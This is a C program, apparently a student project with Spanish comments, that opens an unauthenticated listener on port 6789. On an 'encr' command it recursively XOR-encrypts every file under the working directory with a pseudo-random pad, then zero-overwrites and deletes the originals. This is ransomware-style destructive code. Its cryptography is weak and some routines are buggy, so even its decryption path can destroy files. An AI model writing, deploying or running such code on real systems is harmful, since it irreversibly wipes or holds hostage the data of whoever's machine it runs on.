#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <dirent.h>	//para listar los archivos en el directorio
#include <unistd.h>	//para listar los archivos del directorio
#include <sys/stat.h>	//para saber si un fichero es directorio
#include <sys/types.h>	//para saber si un fichero es directorio
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>  //para usar funcion open
#define BUF_SIZE 4096 // Buffer

#define PORT 6789
#define length_path 200
#define pad_size 3		//tamano en KB del archivo pad.pad
int otpEncrypt(char n_ifile[], char n_ofile[], char n_pad[]){
	/*
		Funcion que cifra el contenido de n_ifile. El mensaje cifrado
		lo escribe en n_ofile. En n_pad se escribe los caracteres con los
		que se cifro el archivo n_ifile.
		Devuelve 0 si se cifro de manera correcta, -2 si no se pudo
		abrir el archivo n_ifile
	*/
	//Semilla para obtener los caracteres pseudo-aleatoriamente
	srand(time(NULL));
	char c_read, c_random, c_write;
	//Sockets para el manejo de los archivos.
	//n_ifile debe existir, n_ofile y n_pad se sobreescriben
	FILE *ifile = fopen(n_ifile, "r"), *ofile = fopen(n_ofile, "w+");
	FILE *npad = fopen(n_pad, "w+");
	if(ifile != NULL){
		//Leemos n_ifile hasta llegar al final del archivo
		while ((c_read = fgetc(ifile)) != EOF) {
			//Generamos el caracter pseudo-aleatorio
			//Se le suma 32 para evitar los caracteres de control (codigo ASCII)
			c_random = (char)(rand()%126) + 32;
			//XOR del caracter aleatorio y el caracter del archivo a cifrar
			c_write = c_read ^ c_random;
			fputc(c_random, npad);
			fputc(c_write, ofile);
		}
		//Cierre de los sockets usados
		fclose(ifile);
		fclose(ofile);
		fclose(npad);
		return 0;
	}
	else{
		//Error si no se pudo abrir n_ifile
		return -2;
	}
}

int otpDecrypt(char n_ifile[], char n_ofile[], char n_pad[]) {
	/*
		Funcion que descifra el contenido de n_ifile. El mensaje descifrado
		lo escribe en n_ofile. De n_pad se leen los caracteres con los
		que se cifro el archivo n_ifile.
		Devuelve 0 si se descifro de manera correcta, -3 si no se pudo
		abrir el archivo n_ifile o el n_pad
	*/
	char c_read, c_pad, c_write;
	//Sockets de conexion con los archivos
	//n_ifile y n_pad deben existir, n_ofile se sobreescribe
	FILE *ifile = fopen(n_ifile, "r"), *ofile = fopen(n_ofile, "w+");
	FILE *npad = fopen(n_pad, "r");
	if(ifile != NULL && npad != NULL) {
		//Se lee cada caracter del archivo n_ifile
		while ((c_read = fgetc(ifile)) != EOF) {
			//Se lee el caracter de cifrado correspondiente
			c_pad = fgetc(npad);
			//Se descifra el mensaje
			c_write = c_read ^ c_pad;

			fputc(c_write, ofile);
		}
		//Cierre de sockets
		fclose(ifile);
		fclose(ofile);
		fclose(npad);
		return 0;
	}
	else {
		//Si no se pudo abrir n_ifile ni n_pad, es error.
		return -3;
	}
}
void DelFiles(char *path_file){
	/*
		Funcion que recibe la ruta de cada archivo, lee su tamaño para sobreescribirlo con
		un buffer de 0, con el fin de que no se puedan recuperar los archivos.
	*/
    // Para obtener el tamaño del archivo
	// int stat(const char *pathname, struct stat *statbuf);
    struct stat stat_buffer;
    // Si la ruta del archivo no existe
    if (stat(path_file, &stat_buffer) == -1)
        return;
    off_t fsize = stat_buffer.st_size; //Obtenemos el tamaño total en Bytes del archivo
    // Declaramos nuestro Descriptor para abrir el archivo como solo escritura O_WRONLY
    int fd = open(path_file, O_WRONLY);
    // Si no se crea el Descriptor
    if (fd == -1)
        return;
    // Reservamos memoria para un apuntador (buf) de tamaño 4096
    void *buf = malloc(BUF_SIZE);
    // Limpiamos buf con ceros
    memset(buf, 0, BUF_SIZE);
    // Variable que nos indicara el estado del archivo cuando es sobreescrito con 0
    ssize_t value_overwr = 0;
    off_t bytes_moved = 0;
    while((value_overwr = write(fd, buf,((fsize - bytes_moved >BUF_SIZE)?BUF_SIZE:(fsize - bytes_moved)))) > 0)
		{
        // printf("Valor de value_overwr: %zd\n",value_overwr);
        // printf("Valor de fsize - bytes_moved: %lld\n",fsize - bytes_moved);
        bytes_moved += value_overwr;
				// printf("Valor de bytes_moved: %lld\n", bytes_moved);
		}
    // Cerramos nuestro Descriptor
    close(fd);
    // Liberamos la memoria de nuestro Buf
    free(buf);

    if (value_overwr == -1)
        return;
    // Removemos el archivo para que no sea accesible
    remove(path_file);
}


long int getFileSize(char *file){
	/*
		Funcion que obtiene el tamano de un archivo.
		Devuelve este valor.
	*/
	FILE *stream;
	long int len;
	if((stream= fopen(file, "r")) != NULL){
		//Se posiciona al final el apuntador
		fseek(stream, 0, SEEK_END);
		//Se cuentan los bytes
		len = ftell(stream);
		//Se regresa el apuntador al inicio del archivo
		fseek(stream, 0, SEEK_SET);
	}
	fclose(stream);
	return len;
}

int decryptFile(char *cwd, char *file){
	/*
		Funcion que prepara los parametros necesarios
		para poder cifrar el archivo dado como parametro
	*/
	char tmp[200] = {0};
	char *outFile = calloc((strlen(file) + 5),sizeof(char));
	strcat(outFile, file);
	//El archivo cifrado se llamara [file].enc
	for (int x = 0; x < (strlen(outFile) - 4); x++)
        tmp[x] = outFile[x];
	strcpy(outFile, tmp);
	char *pad = calloc((strlen(cwd) + 9), sizeof(char));
	strcat(pad, cwd);
	//El nombre del PAD con el que se cifrara el archivo es
	//[cwd]/pad.pad
	strcat(pad, "/pad.pad\0");
	printf("Dec:\n");
	printf("\t%s\n\t%s\n ", file, pad);
	//El archivo pad.pad no se cifrara, por eso se excluye con el condicional
	//if (strcmp(file, pad) != 0)
	//	printf("\t%s\n\t%s", outFile, pad);
		otpDecrypt (file, outFile, pad);

	free(outFile);
	free(pad);

	return 0;
}

int encryptFile(char *cwd, char *file){
	/*
		Funcion que prepara los parametros necesarios
		para poder cifrar el archivo dado como parametro
	*/
	char *outFile = calloc((strlen(file) + 5),sizeof(char));
	strcat(outFile, file);
	//El archivo cifrado se llamara [file].enc
	strcat(outFile, ".enc\0");
	char *pad = calloc((strlen(cwd) + 9), sizeof(char));
	strcat(pad, cwd);
	//El nombre del PAD con el que se cifrara el archivo es
	//[cwd]/pad.pad
	strcat(pad, "/pad.pad\0");
	printf("enc:\n");
	printf("\t%s\n\t%s\n ", file, pad);
	//El archivo pad.pad no se cifrara, por eso se excluye con el condicional
	//if (strcmp(file, pad) != 0)
	//	printf("\t%s\n\t%s", outFile, pad);
		otpEncrypt(file, outFile, pad);

	free(outFile);
	free(pad);

	return 0;
}

char * getAbsPath(char *current_file, char *dir){
	/*
		Funcion que concatena el directorio de un fichero con el
		nombre del fichero para obtener la ruta absoluta de este.
		Retorna un apuntador a la cadena concatenada
	*/
	int len = strlen(current_file) + strlen(dir);
	//Se suman 2 espacios para el slash y el termino de cadena
	//calloc inicializa en cero el espacio reservado
	char *dest_file = calloc (len + 2,sizeof(char));
	strcat(dest_file, dir);
	strcat(dest_file, "/");
	strcat(dest_file, current_file);
	return dest_file;
}

int makePadFile(char *abs_path){
	/*
		Funcion que genera el archivo PAD con el que se encriptaran
		los archivos dentro de la carpeta respectiva.
	*/
	char c_random;
	int i;
	FILE *pad_file;
	char *pad = (char *)calloc(strlen(abs_path) + 9, sizeof(char));
	//Obtenemos el nombre absoluto del archivo
	strcat(pad, abs_path);
	strcat(pad, "/pad.pad\0");
	printf("\t%s\n", pad);
	//Semilla para obtener los caracteres pseudo-aleatoriamente
	srand(time(NULL));
	// Si el archivo exixte en la carpeta no lo creara
	if( access( pad, F_OK ) == -1 ){ // El archivo no exixte
		if((pad_file = fopen(pad, "w+")) != NULL){
			for(i = pad_size*1024; i > 0; i--){
				//Generamos el caracter pseudo-aleatorio
				//Se le suma 32 para evitar los caracteres de control (codigo ASCII)
				c_random = (char)(rand()%126) + 32;
				fputc(c_random, pad_file);
			}
			fclose(pad_file);
			free(pad);
			printf("\t0\n");
			return 0;
		}
	}

	//Si resulta error al abrir el archivo
	free(pad);
	printf("\t-1\n");
	return -1;
}

int getFilesinDir(char *cwd, int opcion){
	/*
		Funcion recursiva que lista todos los ficheros dentro del directorio
		dado como parametro. Cuando un fichero es un archivo comun, se imprime
		su tamano en bytes, cuando es un subdirectorio, se llama de manera
		recursiva a la funcion
	*/
	DIR *d;
    struct dirent *dir;
    char c, abs_path_file[length_path]={0};
    d = opendir(cwd);
    //Si se tiene un apuntador diferente de NULL
    if (d){
    	//Se itera sobre todos los ficheros del directorio
        while ((dir = readdir(d)) != NULL)
        {
			
			//else if (opcion==2){
			//Si es archivo comun, se llama a encryptFile para encriptarlo
			// Si el tipo de archivo es igual a 8 se trata de un archivo comun
					if (dir->d_type == 8 && dir->d_name[0] != '.'){ // Es un archivo
						if (strcmp(dir->d_name, "pad.pad") != 0) { // Para no agregar el archivo pad.pad
							if (strcmp(dir->d_name, "sayCYA") != 0) { // Para no agregar el archivo sayCYA
								strcpy(abs_path_file, getAbsPath(dir->d_name, cwd));
								printf("sendenc:%s\n%s\n", cwd, abs_path_file);
								if (opcion==1)
									encryptFile(cwd, abs_path_file);
								else if (opcion==2)
									decryptFile(cwd, abs_path_file);
								DelFiles(abs_path_file);
							}
						}
					}
				//}
            //Si es un subdirectorio, se llama de manera recursiva a la funcion con
            //la ruta absoluta del subdirectorio
			// Si el tipo de archivo es igual a 4 se trata de un directorio
			else if (dir->d_type == 4){ // Es un directorio
				if((strcmp(dir->d_name, ".") != 0)?(strcmp(dir->d_name, "..") != 0)?(dir->d_name[0] != '.')?1:0:0:0){
		           	strcpy(abs_path_file, getAbsPath(dir->d_name, cwd));
		           	printf("\nnew p: %s\n", abs_path_file);
		           	makePadFile(abs_path_file);
		           	getFilesinDir(abs_path_file,opcion);
	           	}
			}
        }
        closedir(d);
    }
    return 0;
}

int conecta(){
	char cwd[length_path];
	getcwd(cwd, (size_t) sizeof(cwd));
	int sockfd, new_sockfd;  // descriptores de archivo
	//Estructura para guardar los datos necesarios para el socket
	struct sockaddr_in host_addr, client_addr;  // Informacion de las direcciones IP
	socklen_t sin_size;
	int recv_length=1, yes=1;

	char buffer[6];
	memset(buffer, 0, 6);
	char instr[8];
	if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
		perror("Error al crear el socket");

	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
		perror("Error al agregar la opcion SO_REUSEADDR en setsockopt");//----Mensaje que se quita en cuanto termine la creacion-----

	//Establece la familia correspondiente al protocolo
	host_addr.sin_family = AF_INET;     //
	//big endian
	host_addr.sin_port = htons(PORT);   //
	host_addr.sin_addr.s_addr = INADDR_ANY; // Asigno mi IPP
	memset(&(host_addr.sin_zero), '\0', 8); // El resto de la estructura en 0s
	//escucha las peticiones.
	if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)
		perror("Error haciendo el bind");//----Mensaje que se quita en cuanto termine la creacion------

	if (listen(sockfd, 5) == -1)
		perror("Error al escuchar en el socket");//----Mensaje que se quita en cuanto termine la creacion-----

	while(1) {
		sin_size = sizeof(struct sockaddr_in);
		new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
		if(new_sockfd == -1)
			perror("Error al aceptar la conexion");//----Mensaje que se quita en cuanto termine la creacion-----
		send(new_sockfd, "Conexion aceptada. Comienza a teclear\n", 38, 0);
		recv_length = recv(new_sockfd, &buffer, 6, 0);
		while(recv_length > 0) {

			//printf("RECV: %d bytes\nENTRADA: %s...", recv_length, buffer);//----Mensaje que se quita en cuanto termine la creacion-----
			if(strcmp(buffer, "encr\n") == 0){//  command: encr
				/*Aqui iria la funcion de cifrado*/
				send(new_sockfd, "Escogio cifrar\n", 15, 0);
				getFilesinDir(cwd,1);
				
			}
			else if(strcmp(buffer, "decr\n") == 0){//  command: decr
				/*Aqui iria la funcion de descifrado*/
				send(new_sockfd, "Escogio descifrar\n", 18, 0);
				getFilesinDir(cwd,2);
			}
			else if(strcmp(buffer,"stop\n") == 0){//  command: stop
				/*Aqui iria la funcion de  desconectar el socket*/
				send(new_sockfd, "detener todo\n", 13, 0);
				return 1;
			}
			else
				send(new_sockfd, "No se proceso correctamente\n", 28, 0);

			memset(buffer, 0, sizeof(buffer));
			recv_length = recv(new_sockfd, &buffer, 6, 0);
		}
	close(new_sockfd);
	}
  return 0;
}


int main(){
	int a= conecta();
	//char cwd[length_path];
	//getcwd(cwd, (size_t) sizeof(cwd));
	//getFilesinDir(cwd);
}
